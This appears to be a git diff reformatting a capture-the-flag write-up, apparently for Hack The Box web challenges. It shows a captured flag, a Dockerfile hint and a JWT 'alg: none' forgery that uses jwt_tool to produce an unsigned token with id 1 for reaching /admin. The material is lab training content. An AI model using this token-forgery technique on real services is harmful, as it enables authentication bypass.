@@ -23,7 +23,8 @@ View page source
  HTB{V13w_50urc3_c4n_b3_u53ful!!!}
  
  ## Web - Gunpoint
- `cat ReconModel.php`
+ 
+ ReconModel.php
 ```php
 <?php
 #[AllowDynamicProperties]
@@ -289,12 +290,13 @@ def exportFile():
 ```
 
 Dockerfile
+
 We see the flag.txt has been copied to the file ```/signal_sleuth_firmware```
+
 ```docker
 # copy flag
 COPY flag.txt /signal_sleuth_firmware
 COPY files /communications/
-
 ```
 
 Request to get the flag:
@@ -370,11 +372,17 @@ module.exports = AdminMiddleware;
 ```
 
 Use jwt_tool to tamper with [jwt token](https://github.com/ticarpi/jwt_tool)
-```python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.dJjAYGyWsqK-8k1PKsQRW74ZFgc6tFquC0oCiKFaFb0 -X a``` 
+
+```python3
+jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.dJjAYGyWsqK-8k1PKsQRW74ZFgc6tFquC0oCiKFaFb0 -X a
+``` 
+
 - Change algo to 'None' to go to the else section of the if statement
-```python3 jwt_tool.py eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9. -T``` 
+```python3
+jwt_tool.py eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9. -T
+``` 
 - Change id to 1 
-exploit jwt: ```eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.```
+payload: ```eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5MjM5OTU1LCJleHAiOjE2NzkyNDM1NTV9.```
 
 request to get /admin
 ```
